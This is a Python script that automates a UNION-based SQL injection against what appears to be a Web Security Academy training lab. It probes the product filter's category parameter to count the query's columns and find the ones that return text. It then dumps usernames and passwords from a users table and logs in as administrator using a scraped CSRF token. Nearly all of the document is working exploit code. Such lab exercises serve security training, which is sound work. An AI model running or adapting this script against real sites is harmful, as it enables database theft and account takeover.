# determine how many columns are being return from the original query

import requests
import pandas as pd
from bs4 import BeautifulSoup


url = "https://0abe0058044a67f7806ef35300320074.web-security-academy.net/"
rnd = "2dpK5h"

# calculate standard len for query
st_len = len(requests.get(url+"filter", {"category":"test"}).text) 


"""
level 1
find number of columns
"""
lenght=1
while(1):
    print(f"trying {lenght}")

    payload = ("NULL,"*lenght)[:-1]

    l = requests.get(url+"filter", {"category":"' Union SELECT "+payload+"-- -"}).text
    l=len(l)

    if(l<st_len):
        lenght = lenght+1
    else:
        break

print(f"number of columns is {lenght}")


"""
level 2
find useful columns
"""
text = [False for i in range(lenght)]

for i in range(lenght):
    payload = "NULL,"*i
    payload += f"'{rnd}',"
    payload += ("NULL,"*(lenght-i-1))
    payload = payload[:-1]
    
    l = requests.get(url+"filter", {"category":"' Union SELECT "+payload+"-- -"}).text
    l=len(l)
    if(l>st_len):
        text[i]=True

print(text)

"""
level 3
dump credentials from users table
"""

payload = "' Union SELECT username, password from users -- -"
l = requests.get(url+"filter", {"category":payload}).text


tables = pd.read_html(l) # Returns list of all tables on page
t = tables[0] # Select table of interest
print(t)
username = t[0][0]
password = t[1][0]

client = requests.session()

response = client.get(url+"login")

soup = BeautifulSoup(response.content, 'html.parser')
csrf_token = soup.find('input', {'name' : 'csrf'})['value']

login_data = dict(username=username, password=password, csrf=csrf_token, next='/')
r = client.post(url+"login", data=login_data, headers=dict(Referer=url))

print("LOGGED as administrator")
#print(requests.post(url+"login", data={"username":username, "password":password}).text)

